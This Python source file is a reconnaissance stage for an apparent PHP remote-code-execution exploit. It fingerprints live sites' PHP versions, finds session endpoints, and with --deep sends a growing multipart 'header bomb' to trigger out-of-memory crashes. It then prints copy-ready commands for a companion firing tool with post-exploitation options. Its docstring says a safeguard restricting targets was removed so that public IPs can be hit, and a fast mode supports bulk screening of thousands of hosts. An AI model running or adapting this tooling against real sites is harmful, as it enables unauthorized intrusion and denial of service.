#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""recon -- CVE-2026-109618 live-site reconnaissance (read-only by default; deep landing-point probing needs an explicit --deep)

Why it is needed
----------------
Real production sites usually strip X-Powered-By, hide phpinfo, and replace 404 pages with custom ones,
so `fingerprint` alone (body PHP/x.y.z + X-Powered-By) always lands on rc=10
"LIKELY_RCE but no evidence". This module gathers evidence over several **read-only** channels and splits
"can it be exploited" into four independently verifiable preconditions:

  1) version/affected range  -- multi-channel version evidence (header/body/credits/404 signature/cookie)
  2) sink                    -- whether any entry calls session_start() (PHPSESSID issued)
  3) landing point           -- relative relation of post_max_size and memory_limit (measured with --deep)
  4) offset                  -- whether a usable profile exists for the version/build, otherwise calibrate

It outputs a verdict classification + next-step commands that can be copied directly.

Security positioning
--------------------
- By default no oversized body is sent; only `--deep` performs OOM landing-point probing with increasing sizes (throttled and budget-capped,
  which may still cause worker restarts/brief 5xx on production sites and is an active test **requiring authorization**).
- No more address-range checks: public IPs can be used as targets directly, and authorization responsibility rests with the user.
- Division of labor with oneclick: recon only judges feasibility, oneclick does the firing.
"""
import argparse
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))

# Affected range (official fixed versions): 8.2<8.2.35 / 8.3<8.3.36 / 8.4<8.4.27 / 8.5<8.5.12
AFFECTED_RANGES = ((8, 2, 35), (8, 3, 36), (8, 4, 27), (8, 5, 12))

# Builds measured to be unable to complete RCE (in range but lacking infoleak/usable offset): downgrade honestly to avoid false positives
KNOWN_NO_RCE = {"8.2.12": "8.2.x has no Stage-1 infoleak channel, so the heap base cannot be obtained after OOM (all 6 measured rounds failed, only DoS)"}

COMMON_ENTRIES = [
    "/", "/index.php", "/index.html", "/login.php", "/admin/", "/admin.php",
    "/api/", "/home.php", "/main.php", "/app/", "/dashboard/", "/user/",
    "/wp-login.php", "/administrator/", "/phpinfo.php", "/info.php",
]

# Fast mode: query only the home page and index.php, for bulk first-pass screening of thousands of targets
FAST_ENTRIES = ["/", "/index.php"]

PHPINFO_PATHS = ["/phpinfo.php", "/info.php", "/php.php", "/test.php", "/i.php"]

# PHP special ?= query strings (php_logo / credits / phpinfo triggers)
MAGIC_QUERIES = {
    "php_logo": "?=PHPE9568F36-D428-11d2-A769-00AA001ACF42",
    "php_credits": "?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
    "phpinfo_css": "?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
}

VER_RE = re.compile(r"PHP[/ ]?(\d+\.\d{1,2}\.\d{1,3})", re.I)
BODY_VER_RE = re.compile(r"PHP Version\s*<?[^0-9]{0,20}(\d+\.\d{1,2}\.\d{1,3})", re.I)
OOM_SIGS = ("Allowed memory size", "memory_limit", "Out of memory",
            "in Unknown on line 0", "exhausted")
RESET_SIGS = ("Connection reset", "Broken pipe", "timed out", "RemoteDisconnected")


def _env_insecure():
    return os.environ.get("PHP2SHELL_INSECURE", "") == "1"


def _ssl_ctx(insecure, host=""):
    if not insecure:
        return ssl.create_default_context()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _hdrs(obj):
    """Merge repeated headers into "a, b" (urllib's dict conversion drops earlier Set-Cookie values)."""
    acc = {}
    try:
        items = obj.getheaders() if hasattr(obj, "getheaders") else (obj.items() if obj else [])
    except Exception:
        items = []
    for k, v in items:
        k = k.lower()
        acc[k] = (acc[k] + ", " + v) if k in acc else v
    return acc


def is_public_host(host):
    """Kept for external scripts to reference; recon itself no longer blocks targets based on it."""
    if not host:
        return True
    h = host.strip("[]").split(":")[0]
    try:
        import ipaddress
        ip = ipaddress.ip_address(h)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local)
    except ValueError:
        pass
    if h.lower() in ("localhost", "localhost.localdomain"):
        return False
    try:
        ip = socket.gethostbyname(h)
        import ipaddress
        a = ipaddress.ip_address(ip)
        return not (a.is_private or a.is_loopback or a.is_link_local)
    except Exception:
        return True


class Client(object):
    def __init__(self, base, insecure=False, timeout=12.0, ua=None):
        self.base = base.rstrip("/")
        self.insecure = insecure
        self.timeout = timeout
        self.ua = ua or ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                         "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
        self.sent = 0
        self.bytes = 0

    def url(self, path):
        if path.startswith("http://") or path.startswith("https://"):
            return path
        return self.base + (path if path.startswith("/") else "/" + path)

    def _open(self, req):
        host = urllib.parse.urlsplit(req.full_url).hostname or ""
        ctx = _ssl_ctx(self.insecure, host)
        return urllib.request.urlopen(req, timeout=self.timeout, context=ctx)

    def get(self, path, allow_redirects=False):
        req = urllib.request.Request(self.url(path), method="GET")
        req.add_header("User-Agent", self.ua)
        req.add_header("Accept", "*/*")
        return self._do(req, path)

    def post_raw(self, path, body, ctype, allow_redirects=False):
        req = urllib.request.Request(self.url(path), data=body, method="POST")
        req.add_header("User-Agent", self.ua)
        req.add_header("Content-Type", ctype)
        req.add_header("Content-Length", str(len(body)))
        return self._do(req, path)

    def _do(self, req, path):
        self.sent += 1
        t0 = time.time()
        try:
            r = self._open(req)
            code = r.getcode()
            hdrs = _hdrs(r)
            body = r.read(262144)
            r.close()
            self.bytes += len(body)
            return {"path": path, "code": code, "headers": hdrs,
                    "body": body, "err": None, "ms": int((time.time() - t0) * 1000)}
        except urllib.error.HTTPError as e:
            hdrs = _hdrs(e.headers)
            try:
                body = e.read(262144)
            except Exception:
                body = b""
            self.bytes += len(body)
            return {"path": path, "code": e.code, "headers": hdrs, "body": body,
                    "err": None, "ms": int((time.time() - t0) * 1000)}
        except Exception as e:
            return {"path": path, "code": None, "headers": {}, "body": b"",
                    "err": "%s: %s" % (type(e).__name__, e),
                    "ms": int((time.time() - t0) * 1000)}


# ---------------------------------------------------------------- version evidence
def _ver_from_text(s):
    if not s:
        return None
    m = BODY_VER_RE.search(s) or VER_RE.search(s)
    return m.group(1) if m else None


def ver_tuple(v):
    try:
        return tuple(int(x) for x in v.split("."))
    except Exception:
        return None


def classify_version(v):
    t = ver_tuple(v)
    if not t or len(t) != 3:
        return "unknown", None
    for major, minor, fixed in AFFECTED_RANGES:
        if t[0] == major and t[1] == minor:
            if t[2] < fixed:
                return "affected", (major, minor, fixed)
            return "patched", (major, minor, fixed)
    if t[0] < 8 or (t[0] == 8 and t[1] < 2):
        return "too_old", None
    return "unknown", None


def probe_version(c, log, fast=False):
    """Return (candidates:list of (version, channel, evidence), channels:list of dict)"""
    cands = []
    chans = []

    def add(ver, channel, ev):
        chans.append({"channel": channel, "version": ver, "evidence": ev})
        if ver:
            cands.append((ver, channel, ev))

    # 1) headers / body of the home page + index.php (fast mode hits only the home page, 1 request)
    paths = ("/",) if fast else ("/", "/index.php")
    for p in paths:
        r = c.get(p)
        if r["err"]:
            chans.append({"channel": "http:" + p, "version": None, "evidence": "ERR " + r["err"]})
            continue
        xp = r["headers"].get("x-powered-by", "")
        v = _ver_from_text(xp)
        add(v, "header:x-powered-by@" + p, xp[:120])
        sv = r["headers"].get("server", "")
        v2 = _ver_from_text(sv)
        add(v2, "header:server@" + p, sv[:120])
        v3 = _ver_from_text(r["body"].decode("utf-8", "replace")[:65536])
        add(v3, "body@" + p, "code=%s len=%d" % (r["code"], len(r["body"])))
        # markers: cookie names / error-page fingerprints
        sc = r["headers"].get("set-cookie", "")
        if "PHPSESSID" in sc:
            chans.append({"channel": "cookie@" + p, "version": None,
                          "evidence": "Set-Cookie: PHPSESSID (session sink present)"})

    if fast:
        return cands, chans

    # 2) PHP special query strings: logo/credits prove "PHP is running" and often carry a version
    for name, q in MAGIC_QUERIES.items():
        r = c.get("/" + q)
        if r["err"] or r["code"] is None:
            chans.append({"channel": name, "version": None, "evidence": "ERR %s" % r["err"]})
            continue
        ct = r["headers"].get("content-type", "")
        body = r["body"]
        is_gif = body[:6] in (b"GIF87a", b"GIF89a")
        v = _ver_from_text(body.decode("utf-8", "replace")[:20000])
        ev = "code=%s ct=%s gif=%s len=%d" % (r["code"], ct[:40], is_gif, len(body))
        add(v, name, ev)

    # 3) common phpinfo locations
    for p in PHPINFO_PATHS:
        r = c.get(p)
        if r["err"]:
            continue
        if r["code"] == 200 and b"PHP Version" in r["body"]:
            v = _ver_from_text(r["body"].decode("utf-8", "replace")[:80000])
            add(v, "phpinfo@" + p, "200 len=%d" % len(r["body"]))
            break

    # 4) 404 signature: distinguish PHP-FPM / mod_php / non-PHP
    rnd = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    r = c.get("/%s_%d.php" % (rnd, random.randint(1000, 9999)))
    b = r["body"].decode("utf-8", "replace")[:4096]
    sig = []
    if "No input file specified" in b:
        sig.append("php-fpm(No input file specified)")
    if "File not found" in b:
        sig.append("php-fpm(File not found)")
    if r["code"] == 500 and "PHP" in b:
        sig.append("php-500")
    if r["headers"].get("x-powered-by"):
        sig.append("x-powered-by-present")
    chans.append({"channel": "404-signature", "version": _ver_from_text(b),
                  "evidence": "code=%s %s" % (r["code"], ",".join(sig) or "no-php-marker")})

    return cands, chans


def best_version(cands):
    """Pick the mode weighted by channel reliability."""
    weight = {"header:x-powered-by": 5, "body": 3, "phpinfo": 5,
              "php_logo": 2, "php_credits": 2, "header:server": 2}
    score = {}
    for ver, channel, _ev in cands:
        key = channel.split("@")[0]
        score[ver] = score.get(ver, 0) + weight.get(key, 1)
    if not score:
        return None
    return sorted(score.items(), key=lambda kv: -kv[1])[0][0]


# ---------------------------------------------------------------- sinks
def probe_sinks(c, entries, log, fast=False):
    sinks = []
    for p in entries:
        r = c.get(p)
        if r["err"]:
            continue
        sc = r["headers"].get("set-cookie", "")
        if "PHPSESSID" in sc:
            sinks.append({"entry": p, "cookie": sc[:160], "code": r["code"]})
            if fast:
                break
            continue
        # session-type cookies other than PHPSESSID (many frameworks use custom session names)
        for part in sc.split(","):
            kv = part.strip().split(";")[0]
            if "=" not in kv:
                continue
            name, val = kv.split("=", 1)
            name = name.strip()
            val = val.strip().strip('"')
            if len(val) >= 16 and re.search(r"\d", val) and re.search(r"[A-Za-z]", val) \
                    and name.lower() not in ("security", "lang", "theme", "timezone"):
                sinks.append({"entry": p, "cookie": sc[:160], "code": r["code"],
                              "note": "possible session cookie: " + name})
                break
        if fast and sinks:
            break
        time.sleep(0.05)
    return sinks


# ---------------------------------------------------------------- landing point
def build_header_bomb(mb, boundary="----p2srecon"):
    """Build multipart: massive short header lines inside a single part (highest expansion ratio, ~34x measured)."""
    target = int(mb * 1024 * 1024)
    head = ("--%s\r\nContent-Disposition: form-data; name=\"f\"\r\n" % boundary).encode()
    tail = ("\r\n--%s--\r\n" % boundary).encode()
    line = b"X-A: 0123456789abcdef0123456789abcdef\r\n"  # 40B/line
    n = max(1, (target - len(head) - len(tail)) // len(line))
    return head + line * n + tail, "multipart/form-data; boundary=" + boundary


def probe_oom(c, sizes, budget, delay, log):
    """Increase the body size step by step, identify OOM/413/connection anomalies; return probe records and verdict."""
    recs = []
    oom_at = None
    pm_hit_at = None
    for mb in sizes:
        if budget and len(recs) >= budget:
            break
        body, ctype = build_header_bomb(mb)
        r = c.post_raw("/", body, ctype)
        txt = ""
        if r["err"]:
            kind = "reset"
            for s in RESET_SIGS:
                if s.lower() in r["err"].lower():
                    kind = "reset:" + s
                    break
            recs.append({"mb": mb, "code": None, "kind": kind, "err": r["err"][:120],
                         "ms": r["ms"]})
            time.sleep(delay)
            continue
        txt = r["body"].decode("utf-8", "replace")[:20000]
        kind = "normal"
        if r["code"] == 413:
            kind = "post_max_exceeded"
            pm_hit_at = mb
        elif any(s in txt for s in OOM_SIGS):
            kind = "oom"
            oom_at = mb
        elif r["code"] and r["code"] >= 500:
            kind = "5xx"
        recs.append({"mb": mb, "code": r["code"], "kind": kind, "ms": r["ms"],
                     "snippet": txt.strip()[:120]})
        time.sleep(delay)
        if oom_at or pm_hit_at:
            break
    verdict = {
        "oom_at_mb": oom_at,
        "post_max_hit_mb": pm_hit_at,
        # OOM occurs when the body is S MB => memory_limit < parsing overhead of S; post_max did not block before S
        "post_max_gt_memory_limit": bool(oom_at and not pm_hit_at),
        "records": recs,
    }
    return recs, verdict


# ---------------------------------------------------------------- profile matching
def profile_hint(ver):
    db = {}
    try:
        sys.path.insert(0, os.path.dirname(HERE))
        import p2s_ext  # noqa: F401
        db = getattr(p2s_ext, "PROFILE_DB", {}) or {}
    except Exception:
        db = {}
    if not db:
        return {"match": None, "known": [], "advice": "cannot load the built-in profile table"}
    known = sorted(db.keys())
    if ver and ver in db:
        return {"match": ver, "known": known, "advice": "exploitable as-is (same build)"}
    return {"match": None, "known": known,
            "advice": "version not in the built-in table, calibrate required: `p2s_ext.py calibrate -u URL --collab`"}


def rce_chain_status(args, ver, vclass, sinks, oom, profile):
    """Combine the four preconditions into a verdict."""
    php_seen = bool(ver) or bool(sinks)
    if vclass == "patched":
        return "NOT_AFFECTED", "version %s is patched (>= fixed line)" % ver
    if vclass == "too_old":
        return "NOT_AFFECTED", "version %s predates the affected range" % ver
    if vclass == "affected":
        if ver in KNOWN_NO_RCE:
            return "DOS_ONLY", "version %s is in range but measured as not RCE-able: %s" % (ver, KNOWN_NO_RCE[ver])
        if not sinks:
            return "NO_SESSION_SINK", "version is affected but no session sink was observed (PHPSESSID not issued)"
        if args.deep:
            if oom.get("oom_at_mb") and not oom.get("post_max_hit_mb"):
                if profile.get("match"):
                    return "RCE_LIKELY", "all four preconditions: affected version + sink + post_max>memory + known build"
                return "NEEDS_CALIBRATION", "all four preconditions but the build is unknown, calibrate the offset first"
            if oom.get("post_max_hit_mb") and not oom.get("oom_at_mb"):
                return "DOS_ONLY", "body blocked with 413 at %sMB, post_max_size is below the landing point" % oom["post_max_hit_mb"]
            if not oom.get("oom_at_mb"):
                mx = max([r["mb"] for r in oom.get("records", [])] or [0]) if oom.get("records") else 0
                if mx >= 8:
                    return "DOS_ONLY", ("no OOM triggered within %.0fMB: POSTs above post_max_size are silently truncated by PHP"
                                        " (no 413 returned), landing point unreachable -> DoS only" % mx)
                return "UNKNOWN_PRECOND", "incremental probing did not trigger OOM (landing point may be above the probe ceiling, add --probe-sizes 32,64)"
        return "NEEDS_PRECOND_PROBE", "version affected and sink present; landing point not measured, add --deep to decide"
    if php_seen:
        return "UNKNOWN_VERSION", "confirmed to run PHP but the version cannot be determined (add -v --deep or confirm manually via phpinfo/error page)"
    return "UNKNOWN", "no PHP evidence obtained (possibly not a PHP site or a site-wide WAF blocking)"


def next_steps(base, verdict, profile, args):
    cmd = [sys.executable or "python3", os.path.join(HERE, "p2s_ext.py")]
    sec = " --insecure" if args.insecure else ""
    out = []
    if verdict in ("RCE_LIKELY", "NEEDS_CALIBRATION", "NEEDS_PRECOND_PROBE"):
        out.append("%s fingerprint -u %s%s" % (" ".join(cmd), base, sec))
        if verdict == "NEEDS_CALIBRATION":
            out.append("%s calibrate -u %s%s --collab --listen 0.0.0.0:8899" % (" ".join(cmd), base, sec))
        out.append("%s oneclick -u %s%s --http-read %s%s --rounds 8 --tries 2 --force "
                   "--postex --only id --outdir out" % (" ".join(cmd), base, sec, base, sec))
    elif verdict == "DOS_ONLY":
        out.append("DoS only: `%s fingerprint -u %s%s` keeps evidence; continuing is not recommended" % (" ".join(cmd), base, sec))
    elif verdict in ("NOT_AFFECTED", "NO_SESSION_SINK", "UNKNOWN_VERSION", "UNKNOWN"):
        out.append("do not fire; confirm version/entry manually first (%s fingerprint -u %s%s)" % (" ".join(cmd), base, sec))
    return out


def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="recon",
        description="CVE-2026-109618 live-site reconnaissance: multi-channel version evidence + sink + landing point + offset matching")
    ap.add_argument("-u", "--url", required=True, help="target URL (http/https)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS certificate verification (self-signed labs)")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--ua", default=None)
    ap.add_argument("--entries", default="", help="custom entry list (comma-separated), overrides the default set")
    ap.add_argument("--deep", action="store_true",
                    help="enable landing-point probing (sends increasing-size multipart, may cause 5xx, requires authorization)")
    ap.add_argument("--fast", action="store_true",
                    help="fast mode: only check home page version + at most 2 sink entries (2–3 requests), skipping magic/phpinfo/404 and --deep")
    ap.add_argument("--probe-sizes", default="0.5,1,2,4,8,16")
    ap.add_argument("--budget", type=int, default=6, help="max number of deep probe requests")
    ap.add_argument("--delay", type=float, default=1.0, help="delay between deep probes in seconds")
    ap.add_argument("--json", action="store_true", help="output JSON")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args(argv)
    a.insecure = a.insecure or _env_insecure()
    if a.fast and a.deep:
        sys.stderr.write("[*] --fast is enabled: skipping --deep landing-point probing (fast mode is read-only first-pass screening only)\n")
        a.deep = False

    base = a.url.rstrip("/")

    c = Client(base, insecure=a.insecure, timeout=a.timeout, ua=a.ua)
    t0 = time.time()

    # TCP precheck: if the connection fails, judge UNREACHABLE immediately instead of waiting for 3 HTTP timeouts (big difference in bulk runs)
    pu = urllib.parse.urlsplit(base)
    phost = pu.hostname or ""
    pport = pu.port or (443 if pu.scheme == "https" else 80)
    pre_err = None
    try:
        sock = socket.create_connection((phost, pport), timeout=min(2.5, a.timeout))
        sock.close()
    except Exception as e:
        pre_err = "%s: %s" % (type(e).__name__, e)
    if pre_err:
        report = {
            "target": base, "insecure": a.insecure, "deep": False, "fast": a.fast,
            "php_version": None, "version_class": "unknown", "fixed_in": None,
            "version_channels": [], "session_sinks": [],
            "deep_probes": [], "precondition": {}, "profile": {},
            "verdict": "UNREACHABLE",
            "reason": "TCP connection failed (%s:%s): %s" % (phost, pport, pre_err),
            "next_steps": [], "requests": 0, "bytes": 0, "tcp_ok": False,
            "elapsed_ms": int((time.time() - t0) * 1000),
        }
        if a.json:
            print(json.dumps(report, ensure_ascii=False, indent=2))
        else:
            print("[!] TCP precheck failed %s:%s -- %s" % (phost, pport, pre_err))
        return 50

    if not a.json:
        print("[*] recon target: %s (fast=%s insecure=%s deep=%s)"
              % (base, a.fast, a.insecure, a.deep))

    cands, chans = probe_version(c, print, fast=a.fast)
    ver = best_version(cands)
    vclass, fixed = classify_version(ver) if ver else ("unknown", None)

    entries = ([x.strip() for x in a.entries.split(",") if x.strip()]
               or (FAST_ENTRIES if a.fast else COMMON_ENTRIES))
    # when the version is confirmed patched/too old there is no need to look for sinks, fast mode saves 1–2 requests
    if a.fast and vclass in ("patched", "too_old"):
        sinks = []
    else:
        sinks = probe_sinks(c, entries, print, fast=a.fast)

    oom_recs, oom = [], {}
    if a.deep:
        sizes = []
        for s in a.probe_sizes.split(","):
            try:
                sizes.append(float(s))
            except ValueError:
                pass
        sizes = sorted(set(sizes))
        oom_recs, oom = probe_oom(c, sizes, a.budget, a.delay, print)

    profile = profile_hint(ver)
    verdict, reason = rce_chain_status(a, ver, vclass, sinks, oom, profile)
    steps = next_steps(base, verdict, profile, a)
    report = {
        "target": base, "insecure": a.insecure, "deep": a.deep, "fast": a.fast,
        "php_version": ver, "version_class": vclass, "fixed_in": fixed,
        "version_channels": chans, "session_sinks": sinks,
        "deep_probes": oom_recs, "precondition": oom, "profile": profile,
        "verdict": verdict, "reason": reason, "next_steps": steps,
        "requests": c.sent, "bytes": c.bytes, "tcp_ok": True,
        "elapsed_ms": int((time.time() - t0) * 1000),
    }
    if a.json:
        print(json.dumps(report, ensure_ascii=False, indent=2))
    else:
        print("\n== version evidence ==")
        for ch in chans:
            print("  [%-22s] %-10s %s" % (ch["channel"], ch["version"] or "-", ch["evidence"]))
        fixnote = (", fixed line %d.%d.%d" % fixed) if fixed else ""
        print("  => version %s (%s%s)" % (ver or "unknown", vclass, fixnote))
        print("\n== session sinks ==")
        if sinks:
            for s in sinks[:8]:
                print("  [sink] %-16s code=%s %s" % (s["entry"], s["code"], s.get("cookie", "")[:90]))
        else:
            print("  no PHPSESSID/session cookie observed (%d entries)" % len(entries))
        if a.deep:
            print("\n== landing-point probing (--deep) ==")
            for r in oom_recs:
                print("  %5.2f MB -> code=%s kind=%-18s %s" % (r["mb"], r["code"], r["kind"],
                                                              (r.get("err") or r.get("snippet") or "")[:70]))
            print("  => OOM@%s MB, post_max block@%s MB, post_max>memory_limit=%s"
                  % (oom.get("oom_at_mb"), oom.get("post_max_hit_mb"),
                     oom.get("post_max_gt_memory_limit")))
        print("\n== profile ==")
        print("  match=%s known=%s" % (profile.get("match"), ",".join(profile.get("known") or [])[:120]))
        print("  %s" % profile.get("advice"))
        print("\n== verdict: %s ==" % verdict)
        print("  %s" % reason)
        if steps:
            print("\n== next steps ==")
            for s in steps:
                print("  " + s)
        print("\n[stats] requests %d / downloaded %d B / elapsed %d ms"
              % (c.sent, c.bytes, report["elapsed_ms"]))

    if verdict in ("RCE_LIKELY", "NEEDS_CALIBRATION", "NEEDS_PRECOND_PROBE"):
        return 10
    if verdict == "DOS_ONLY":
        return 20
    if verdict == "NOT_AFFECTED":
        return 30
    if verdict == "UNKNOWN":
        return 50
    return 15


if __name__ == "__main__":
    sys.exit(main())
